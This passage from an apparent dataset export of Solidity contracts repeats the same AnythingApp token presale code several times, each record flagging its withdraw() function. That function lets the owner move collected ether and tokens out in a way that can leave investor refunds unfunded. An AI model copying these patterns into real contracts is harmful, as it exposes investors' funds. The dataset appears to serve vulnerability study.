require(block.timestamp >= startTime && block.timestamp < endTime);\n _;\n }\n modifier preSaleEnded() {\n require(block.timestamp >= endTime);\n _;\n }\n modifier inWhiteList() {\n require(investorWhiteList.isAllowed(msg.sender));\n _;\n }\n function AnythingAppTokenPreSale(\n address _token,\n address _beneficiary,\n address _investorWhiteList,\n uint _totalTokens,\n uint _tokenPriceUsd,\n uint _baseEthUsdPrice,\n uint _firstStage,\n uint _secondStage,\n uint _thirdStage,\n uint _startTime,\n uint _endTime\n ) {\n ethUsdRate = _baseEthUsdPrice;\n tokenPriceUsd = _tokenPriceUsd;\n totalTokens = _totalTokens.mul(1 ether);\n token = AnythingAppToken(_token);\n investorWhiteList = InvestorWhiteList(_investorWhiteList);\n beneficiary = _beneficiary;\n firstStage = _firstStage.mul(1 ether);\n secondStage = _secondStage.mul(1 ether);\n thirdStage = _thirdStage.mul(1 ether);\n startTime = _startTime;\n endTime = _endTime;\n }\n function() payable inWhiteList {\n doPurchase(msg.sender);\n }\n function tokenFallback(address _from, uint _value, bytes _data) public pure { }\n function doPurchase(address _owner) private preSaleActive inNormalState {\n if (token.balanceOf(msg.sender) == 0) investorCount++;\n uint tokens = msg.value.mul(ethUsdRate).div(tokenPriceUsd);\n address referral = investorWhiteList.getReferralOf(msg.sender);\n uint referralBonus = calculateReferralBonus(tokens);\n uint bonus = calculateBonus(tokens, referral);\n tokens = tokens.add(bonus);\n uint newTokensSold = tokensSold.add(tokens);\n if (referralBonus > 0 && referral != 0x0) {\n newTokensSold = newTokensSold.add(referralBonus);\n }\n require(newTokensSold <= totalTokens);\n require(token.balanceOf(msg.sender).add(tokens) <= LIMIT_PER_USER);\n tokensSold = newTokensSold;\n collected = collected.add(msg.value);\n deposited[msg.sender] = deposited[msg.sender].add(msg.value);\n token.transfer(msg.sender, tokens);\n NewContribution(_owner, tokens, msg.value);\n if (referralBonus > 0 && referral != 0x0) {\n token.transfer(referral, referralBonus);\n NewReferralTransfer(msg.sender, referral, referralBonus);\n }\n }\n function calculateBonus(uint _tokens, address _referral) private returns (uint _bonuses) {\n uint bonus;\n if (tokensSold < firstStage) {\n bonus = BONUS_LEVEL_1;\n } else if (tokensSold >= firstStage && tokensSold < secondStage) {\n bonus = BONUS_LEVEL_2;\n } else {\n bonus = BONUS_LEVEL_3;\n }\n if (_referral != 0x0) {\n bonus += 5;\n }\n return _tokens.mul(bonus).div(100);\n }\n function calculateReferralBonus(uint _tokens) internal constant returns (uint _bonus) {\n return _tokens.mul(20).div(100);\n }\n function withdraw() external onlyOwner {\n uint withdrawLimit = 500 ether;\n if (withdrawn < withdrawLimit) {\n uint toWithdraw = collected.sub(withdrawn);\n if (toWithdraw + withdrawn > withdrawLimit) {\n toWithdraw = withdrawLimit.sub(withdrawn);\n }\n beneficiary.transfer(toWithdraw);\n withdrawn = withdrawn.add(toWithdraw);\n return;\n }\n require(block.timestamp >= endTime);\n beneficiary.transfer(collected);\n token.transfer(beneficiary, token.balanceOf(this));\n crowdsaleFinished = true;\n }\n function refund() external preSaleEnded inNormalState {\n require(refunded[msg.sender] == false);\n uint refund = deposited[msg.sender];\n require(refund > 0);\n deposited[msg.sender] = 0;\n refunded[msg.sender] = true;\n weiRefunded = weiRefunded.add(refund);\n msg.sender.transfer(refund);\n Refunded(msg.sender, refund);\n }\n function receiveEthPrice(uint ethUsdPrice) external onlyEthPriceProvider {\n require(ethUsdPrice > 0);\n ethUsdRate = ethUsdPrice;\n }\n function setEthPriceProvider(address provider) external onlyOwner {\n require(provider != 0x0);\n ethPriceProvider = provider;\n }\n function setNewWhiteList(address newWhiteList) external onlyOwner {\n require(newWhiteList != 0x0);\n investorWhiteList = InvestorWhiteList(newWhiteList);\n }\n}",
  "extract_feature": [
    "function withdraw() external onlyOwner {\nuint withdrawLimit = 500 ether;\nif (withdrawn < withdrawLimit) {\nuint toWithdraw = collected.sub(withdrawn);\nif (toWithdraw + withdrawn > withdrawLimit) {\ntoWithdraw = withdrawLimit.sub(withdrawn);\n}\nbeneficiary.transfer(toWithdraw);\nwithdrawn = withdrawn.add(toWithdraw);\nreturn;\n}\nrequire(block.timestamp >= endTime);\nbeneficiary.transfer(collected);\ntoken.transfer(beneficiary, token.balanceOf(this));\ncrowdsaleFinished = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ed5"
  },
  "filename": "10831.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Ownable {\n address public owner;\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n}\ncontract Haltable is Ownable {\n bool public halted = false;\n modifier inNormalState {\n require(!halted);\n _;\n }\n modifier inEmergencyState {\n require(halted);\n _;\n }\n function halt() external onlyOwner inNormalState {\n halted = true;\n }\n function unhalt() external onlyOwner inEmergencyState {\n halted = false;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) constant returns (uint256);\n function transfer(address to, uint256 value) returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) returns (bool) {\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) returns (bool);\n function approve(address spender, uint256 value) returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) allowed;\n function transferFrom(address _from, address _to, uint256 _value) returns (bool) {\n var _allowance = allowed[_from][msg.sender];\n balances[_to] = balances[_to].add(_value);\n balances[_from] = balances[_from].sub(_value);\n allowed[_from][msg.sender] = _allowance.sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) returns (bool) {\n require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract Burnable is StandardToken {\n using SafeMath for uint;\n event Burn(address indexed from, uint value);\n function burn(uint _value) returns (bool success) {\n require(_value > 0 && balances[msg.sender] >= _value);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(msg.sender, _value);\n return true;\n }\n function burnFrom(address _from, uint _value) returns (bool success) {\n require(_from != 0x0 && _value > 0 && balances[_from] >= _value);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n totalSupply = totalSupply.sub(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Burn(_from, _value);\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n require(_to != 0x0);\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n require(_to != 0x0);\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract ERC223ReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data);\n}\ncontract AnythingAppToken is Burnable, Ownable {\n string public constant name = \"AnythingApp Token\";\n string public constant symbol = \"ANY\";\n uint8 public constant decimals = 18;\n uint public constant INITIAL_SUPPLY = 400000000 * 1 ether;\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n event Transfer(address indexed from, address indexed to, uint value, bytes data);\n modifier canTransfer(address _sender) {\n require(released || transferAgents[_sender]);\n _;\n }\n modifier inReleaseState(bool releaseState) {\n require(releaseState == released);\n _;\n }\n modifier onlyReleaseAgent() {\n require(msg.sender == releaseAgent);\n _;\n }\n function AnythingAppToken() {\n totalSupply = INITIAL_SUPPLY;\n balances[msg.sender] = INITIAL_SUPPLY;\n Transfer(0x0, msg.sender, INITIAL_SUPPLY);\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n require(addr != 0x0);\n releaseAgent = addr;\n }\n function release() onlyReleaseAgent inReleaseState(false) public {\n released = true;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n require(addr != 0x0);\n transferAgents[addr] = state;\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint _value, bytes _data) canTransfer(msg.sender) returns (bool success) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength>0) {\n ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n uint codeLength;\n bytes memory empty;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength>0) {\n ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);\n receiver.tokenFallback(msg.sender, _value, empty);\n }\n Transfer(msg.sender, _to, _value, empty);\n return true;\n }\n function burn(uint _value) onlyOwner returns (bool success) {\n return super.burn(_value);\n }\n function burnFrom(address _from, uint _value) onlyOwner returns (bool success) {\n return super.burnFrom(_from, _value);\n }\n}\ncontract InvestorWhiteList is Ownable {\n mapping (address => bool) public investorWhiteList;\n mapping (address => address) public referralList;\n function InvestorWhiteList() {\n }\n function addInvestorToWhiteList(address investor) external onlyOwner {\n require(investor != 0x0 && !investorWhiteList[investor]);\n investorWhiteList[investor] = true;\n }\n function removeInvestorFromWhiteList(address investor) external onlyOwner {\n require(investor != 0x0 && investorWhiteList[investor]);\n investorWhiteList[investor] = false;\n }\n function addReferralOf(address investor, address referral) external onlyOwner {\n require(investor != 0x0 && referral != 0x0 && referralList[investor] == 0x0 && investor != referral);\n referralList[investor] = referral;\n }\n function isAllowed(address investor) constant external returns (bool result) {\n return investorWhiteList[investor];\n }\n function getReferralOf(address investor) constant external returns (address result) {\n return referralList[investor];\n }\n}\ncontract PriceReceiver {\n address public ethPriceProvider;\n modifier onlyEthPriceProvider() {\n require(msg.sender == ethPriceProvider);\n _;\n }\n function receiveEthPrice(uint ethUsdPrice) external;\n function setEthPriceProvider(address provider) external;\n}\ncontract AnythingAppTokenPreSale is Haltable, PriceReceiver {\n using SafeMath for uint;\n string public constant name = \"AnythingAppTokenPreSale\";\n AnythingAppToken public token;\n InvestorWhiteList public investorWhiteList;\n address public beneficiary;\n uint public tokenPriceUsd;\n uint public totalTokens;\n uint public ethUsdRate;\n uint public collected = 0;\n uint public withdrawn = 0;\n uint public tokensSold = 0;\n uint public investorCount = 0;\n uint public weiRefunded = 0;\n uint public startTime;\n uint public endTime;\n bool public crowdsaleFinished = false;\n mapping (address => bool) public refunded;\n mapping (address => uint) public deposited;\n uint public constant BONUS_LEVEL_1 = 40;\n uint public constant BONUS_LEVEL_2 = 35;\n uint public constant BONUS_LEVEL_3 = 30;\n uint public firstStage;\n uint public secondStage;\n uint public thirdStage;\n uint public constant MINIMAL_PURCHASE = 250 ether;\n uint public constant LIMIT_PER_USER = 500000 ether;\n event NewContribution(address indexed holder, uint tokenAmount, uint etherAmount);\n event NewReferralTransfer(address indexed investor, address indexed referral, uint tokenAmount);\n event Refunded(address indexed holder, uint amount);\n event Deposited(address indexed holder, uint amount);\n modifier preSaleActive() {\n require(block.timestamp >= startTime && block.timestamp < endTime);\n _;\n }\n modifier preSaleEnded() {\n require(block.timestamp >= endTime);\n _;\n }\n modifier inWhiteList() {\n require(investorWhiteList.isAllowed(msg.sender));\n _;\n }\n function AnythingAppTokenPreSale(\n address _token,\n address _beneficiary,\n address _investorWhiteList,\n uint _totalTokens,\n uint _tokenPriceUsd,\n uint _baseEthUsdPrice,\n uint _firstStage,\n uint _secondStage,\n uint _thirdStage,\n uint _startTime,\n uint _endTime\n ) {\n ethUsdRate = _baseEthUsdPrice;\n tokenPriceUsd = _tokenPriceUsd;\n totalTokens = _totalTokens.mul(1 ether);\n token = AnythingAppToken(_token);\n investorWhiteList = InvestorWhiteList(_investorWhiteList);\n beneficiary = _beneficiary;\n firstStage = _firstStage.mul(1 ether);\n secondStage = _secondStage.mul(1 ether);\n thirdStage = _thirdStage.mul(1 ether);\n startTime = _startTime;\n endTime = _endTime;\n }\n function() payable inWhiteList {\n doPurchase(msg.sender);\n }\n function tokenFallback(address _from, uint _value, bytes _data) public pure { }\n function doPurchase(address _owner) private preSaleActive inNormalState {\n if (token.balanceOf(msg.sender) == 0) investorCount++;\n uint tokens = msg.value.mul(ethUsdRate).div(tokenPriceUsd);\n address referral = investorWhiteList.getReferralOf(msg.sender);\n uint referralBonus = calculateReferralBonus(tokens);\n uint bonus = calculateBonus(tokens, referral);\n tokens = tokens.add(bonus);\n uint newTokensSold = tokensSold.add(tokens);\n if (referralBonus > 0 && referral != 0x0) {\n newTokensSold = newTokensSold.add(referralBonus);\n }\n require(newTokensSold <= totalTokens);\n require(token.balanceOf(msg.sender).add(tokens) <= LIMIT_PER_USER);\n tokensSold = newTokensSold;\n collected = collected.add(msg.value);\n deposited[msg.sender] = deposited[msg.sender].add(msg.value);\n token.transfer(msg.sender, tokens);\n NewContribution(_owner, tokens, msg.value);\n if (referralBonus > 0 && referral != 0x0) {\n token.transfer(referral, referralBonus);\n NewReferralTransfer(msg.sender, referral, referralBonus);\n }\n }\n function calculateBonus(uint _tokens, address _referral) private returns (uint _bonuses) {\n uint bonus;\n if (tokensSold < firstStage) {\n bonus = BONUS_LEVEL_1;\n } else if (tokensSold >= firstStage && tokensSold < secondStage) {\n bonus = BONUS_LEVEL_2;\n } else {\n bonus = BONUS_LEVEL_3;\n }\n if (_referral != 0x0) {\n bonus += 5;\n }\n return _tokens.mul(bonus).div(100);\n }\n function calculateReferralBonus(uint _tokens) internal constant returns (uint _bonus) {\n return _tokens.mul(20).div(100);\n }\n function withdraw() external onlyOwner {\n uint withdrawLimit = 500 ether;\n if (withdrawn < withdrawLimit) {\n uint toWithdraw = collected.sub(withdrawn);\n if (toWithdraw + withdrawn > withdrawLimit) {\n toWithdraw = withdrawLimit.sub(withdrawn);\n }\n beneficiary.transfer(toWithdraw);\n withdrawn = withdrawn.add(toWithdraw);\n return;\n }\n require(block.timestamp >= endTime);\n beneficiary.transfer(collected);\n token.transfer(beneficiary, token.balanceOf(this));\n crowdsaleFinished = true;\n }\n function refund() external preSaleEnded inNormalState {\n require(refunded[msg.sender] == false);\n uint refund = deposited[msg.sender];\n require(refund > 0);\n deposited[msg.sender] = 0;\n refunded[msg.sender] = true;\n weiRefunded = weiRefunded.add(refund);\n msg.sender.transfer(refund);\n Refunded(msg.sender, refund);\n }\n function receiveEthPrice(uint ethUsdPrice) external onlyEthPriceProvider {\n require(ethUsdPrice > 0);\n ethUsdRate = ethUsdPrice;\n }\n function setEthPriceProvider(address provider) external onlyOwner {\n require(provider != 0x0);\n ethPriceProvider = provider;\n }\n function setNewWhiteList(address newWhiteList) external onlyOwner {\n require(newWhiteList != 0x0);\n investorWhiteList = InvestorWhiteList(newWhiteList);\n }\n}",
  "extract_feature": [
    "function withdraw() external onlyOwner {\nuint withdrawLimit = 500 ether;\nif (withdrawn < withdrawLimit) {\nuint toWithdraw = collected.sub(withdrawn);\nif (toWithdraw + withdrawn > withdrawLimit) {\ntoWithdraw = withdrawLimit.sub(withdrawn);\n}\nbeneficiary.transfer(toWithdraw);\nwithdrawn = withdrawn.add(toWithdraw);\nreturn;\n}\nrequire(block.timestamp >= endTime);\nbeneficiary.transfer(collected);\ntoken.transfer(beneficiary, token.balanceOf(this));\ncrowdsaleFinished = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ed6"
  },
  "filename": "10833.sol",
  "content": "pragma solidity ^0.4.11;\ncontract Ownable {\n address public owner;\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n}\ncontract Haltable is Ownable {\n bool public halted = false;\n modifier inNormalState {\n require(!halted);\n _;\n }\n modifier inEmergencyState {\n require(halted);\n _;\n }\n function halt() external onlyOwner inNormalState {\n halted = true;\n }\n function unhalt() external onlyOwner inEmergencyState {\n halted = false;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) constant returns (uint256);\n function transfer(address to, uint256 value) returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) returns (bool) {\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) returns (bool);\n function approve(address spender, uint256 value) returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) allowed;\n function transferFrom(address _from, address _to, uint256 _value) returns (bool) {\n var _allowance = allowed[_from][msg.sender];\n balances[_to] = balances[_to].add(_value);\n balances[_from] = balances[_from].sub(_value);\n allowed[_from][msg.sender] = _allowance.sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) returns (bool) {\n require((_value == 0) || (allowed[msg.sender][_spender] == 0));\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract Burnable is StandardToken {\n using SafeMath for uint;\n event Burn(address indexed from, uint value);\n function burn(uint _value) returns (bool success) {\n require(_value > 0 && balances[msg.sender] >= _value);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(msg.sender, _value);\n return true;\n }\n function burnFrom(address _from, uint _value) returns (bool success) {\n require(_from != 0x0 && _value > 0 && balances[_from] >= _value);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n totalSupply = totalSupply.sub(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Burn(_from, _value);\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n require(_to != 0x0);\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n require(_to != 0x0);\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract ERC223ReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data);\n}\ncontract AnythingAppToken is Burnable, Ownable {\n string public constant name = \"AnythingApp Token\";\n string public constant symbol = \"ANY\";\n uint8 public constant decimals = 18;\n uint public constant INITIAL_SUPPLY = 400000000 * 1 ether;\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n event Transfer(address indexed from, address indexed to, uint value, bytes data);\n modifier canTransfer(address _sender) {\n require(released || transferAgents[_sender]);\n _;\n }\n modifier inReleaseState(bool releaseState) {\n require(releaseState == released);\n _;\n }\n modifier onlyReleaseAgent() {\n require(msg.sender == releaseAgent);\n _;\n }\n function AnythingAppToken() {\n totalSupply = INITIAL_SUPPLY;\n balances[msg.sender] = INITIAL_SUPPLY;\n Transfer(0x0, msg.sender, INITIAL_SUPPLY);\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n require(addr != 0x0);\n releaseAgent = addr;\n }\n function release() onlyReleaseAgent inReleaseState(false) public {\n released = true;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n require(addr != 0x0);\n transferAgents[addr] = state;\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint _value, bytes _data) canTransfer(msg.sender) returns (bool success) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength>0) {\n ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n uint codeLength;\n bytes memory empty;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength>0) {\n ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);\n receiver.tokenFallback(msg.sender, _value, empty);\n }\n Transfer(msg.sender, _to, _value, empty);\n return true;\n }\n function burn(uint _value) onlyOwner returns (bool success) {\n return super.burn(_value);\n }\n function burnFrom(address _from, uint _value) onlyOwner returns (bool success) {\n return super.burnFrom(_from, _value);\n }\n}\ncontract InvestorWhiteList is Ownable {\n mapping (address => bool) public investorWhiteList;\n mapping (address => address) public referralList;\n function InvestorWhiteList() {\n }\n function addInvestorToWhiteList(address investor) external onlyOwner {\n require(investor != 0x0 && !investorWhiteList[investor]);\n investorWhiteList[investor] = true;\n }\n function removeInvestorFromWhiteList(address investor) external onlyOwner {\n require(investor != 0x0 && investorWhiteList[investor]);\n investorWhiteList[investor] = false;\n }\n function addReferralOf(address investor, address referral) external onlyOwner {\n require(investor != 0x0 && referral != 0x0 && referralList[investor] == 0x0 && investor != referral);\n referralList[investor] = referral;\n }\n function isAllowed(address investor) constant external returns (bool result) {\n return investorWhiteList[investor];\n }\n function getReferralOf(address investor) constant external returns (address result) {\n return referralList[investor];\n }\n}\ncontract PriceReceiver {\n address public ethPriceProvider;\n modifier onlyEthPriceProvider() {\n require(msg.sender == ethPriceProvider);\n _;\n }\n function receiveEthPrice(uint ethUsdPrice) external;\n function setEthPriceProvider(address provider) external;\n}\ncontract AnythingAppTokenPreSale is Haltable, PriceReceiver {\n using SafeMath for uint;\n string public constant name = \"AnythingAppTokenPreSale\";\n AnythingAppToken public token;\n InvestorWhiteList public investorWhiteList;\n address public beneficiary;\n uint public tokenPriceUsd;\n uint public totalTokens;\n uint public ethUsdRate;\n uint public collected = 0;\n uint public withdrawn = 0;\n uint public tokensSold = 0;\n uint public investorCount = 0;\n uint public weiRefunded = 0;\n uint public startTime;\n uint public endTime;\n bool public crowdsaleFinished = false;\n mapping (address => bool) public refunded;\n mapping (address => uint) public deposited;\n uint public constant BONUS_LEVEL_1 = 40;\n uint public constant BONUS_LEVEL_2 = 35;\n uint public constant BONUS_LEVEL_3 = 30;\n uint public firstStage;\n uint public secondStage;\n uint public thirdStage;\n uint public constant MINIMAL_PURCHASE = 250 ether;\n uint public constant LIMIT_PER_USER = 500000 ether;\n event NewContribution(address indexed holder, uint tokenAmount, uint etherAmount);\n event NewReferralTransfer(address indexed investor, address indexed referral, uint tokenAmount);\n event Refunded(address indexed holder, uint amount);\n event Deposited(address indexed holder, uint amount);\n modifier preSaleActive() {\n require(block.timestamp >= startTime && block.timestamp < endTime);\n _;\n }\n modifier preSaleEnded() {\n require(block.timestamp >= endTime);\n _;\n }\n modifier inWhiteList() {\n require(investorWhiteList.isAllowed(msg.sender));\n _;\n }\n function AnythingAppTokenPreSale(\n address _token,\n address _beneficiary,\n address _investorWhiteList,\n uint _totalTokens,\n uint _tokenPriceUsd,\n uint _baseEthUsdPrice,\n uint _firstStage,\n uint _secondStage,\n uint _thirdStage,\n uint _startTime,\n uint _endTime\n ) {\n ethUsdRate = _baseEthUsdPrice;\n tokenPriceUsd = _tokenPriceUsd;\n totalTokens = _totalTokens.mul(1 ether);\n token = AnythingAppToken(_token);\n investorWhiteList = InvestorWhiteList(_investorWhiteList);\n beneficiary = _beneficiary;\n firstStage = _firstStage.mul(1 ether);\n secondStage = _secondStage.mul(1 ether);\n thirdStage = _thirdStage.mul(1 ether);\n startTime = _startTime;\n endTime = _endTime;\n }\n function() payable inWhiteList {\n doPurchase(msg.sender);\n }\n function tokenFallback(address _from, uint _value, bytes _data) public pure { }\n function doPurchase(address _owner) private preSaleActive inNormalState {\n if (token.balanceOf(msg.sender) == 0) investorCount++;\n uint tokens = msg.value.mul(ethUsdRate).div(tokenPriceUsd);\n address referral = investorWhiteList.getReferralOf(msg.sender);\n uint referralBonus = calculateReferralBonus(tokens);\n uint bonus = calculateBonus(tokens, referral);\n tokens = tokens.add(bonus);\n uint newTokensSold = tokensSold.add(tokens);\n if (referralBonus > 0 && referral != 0x0) {\n newTokensSold = newTokensSold.add(referralBonus);\n }\n require(newTokensSold <= totalTokens);\n require(token.balanceOf(msg.sender).add(tokens) <= LIMIT_PER_USER);\n tokensSold = newTokensSold;\n collected = collected.add(msg.value);\n deposited[msg.sender] = deposited[msg.sender].add(msg.value);\n token.transfer(msg.sender, tokens);\n NewContribution(_owner, tokens, msg.value);\n if (referralBonus > 0 && referral != 0x0) {\n token.transfer(referral, referralBonus);\n NewReferralTransfer(msg.sender, referral, referralBonus);\n }\n }\n function calculateBonus(uint _tokens, address _referral) private returns (uint _bonuses) {\n uint bonus;\n if (tokensSold < firstStage) {\n bonus = BONUS_LEVEL_1;\n } else if (tokensSold >= firstStage && tokensSold < secondStage) {\n bonus = BONUS_LEVEL_2;\n } else {\n bonus = BONUS_LEVEL_3;\n }\n if (_referral != 0x0) {\n bonus += 5;\n }\n return _tokens.mul(bonus).div(100);\n }\n function calculateReferralBonus(uint _tokens) internal constant returns (uint _bonus) {\n return _tokens.mul(20).div(100);\n }\n function withdraw() external onlyOwner {\n uint withdrawLimit = 500 ether;\n if (withdrawn < withdrawLimit) {\n uint toWithdraw = collected.sub(withdrawn);\n if (toWithdraw + withdrawn > withdrawLimit) {\n toWithdraw = withdrawLimit.sub(withdrawn);\n }\n beneficiary.transfer(toWithdraw);\n withdrawn = withdrawn.add(toWithdraw);\n return;\n }\n require(block.timestamp >= endTime);\n beneficiary.transfer(collected);\n token.transfer(beneficiary, token.balanceOf(this));\n crowdsaleFinished = true;\n }\n function refund() external preSaleEnded inNormalState {\n require(refunded[msg.sender] == false);\n uint refund = deposited[msg.sender];\n require(refund > 0);\n deposited[msg.sender] = 0;\n refunded[msg.sender] = true;\n weiRefunded = weiRefunded.add(refund);\n msg.sender.transfer(refund);\n Refunded(msg.sender, refund);\n }\n function receiveEthPrice(uint ethUsdPrice) external onlyEthPriceProvider {\n require(ethUsdPrice > 0);\n ethUsdRate = ethUsdPrice;\n }\n function setEthPriceProvider(address provider) external onlyOwner {\n require(provider != 0x0);\n ethPriceProvider = provider;\n }\n function setNewWhiteList(address newWhiteList) external onlyOwner {\n require(newWhiteList != 0x0);\n investorWhiteList = InvestorWhiteList(newWhiteList);\n }\n}",
  "extract_feature": [
    "function withdraw() external onlyOwner {\nuint withdrawLimit = 500 ether;\nif (withdrawn < withdrawLimit) {\nuint toWithdraw = collected.sub(withdrawn);\nif (toWithdraw + withdrawn > withdrawLimit) {\ntoWithdraw = withdrawLimit.sub(withdrawn);\n}\nbeneficiary.transfer(toWithdraw);\nwithdrawn = withdrawn.add(toWithdraw);\nreturn;\n}\nrequire(block.timestamp >= endTime);\nbeneficiary.transfer(collected);\ntoken.transfer(beneficiary, token.balanceOf(this));\ncrowdsaleFinished = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa8fa0e1460cdfa1ed7"
  },
  "filename": "10855.sol",
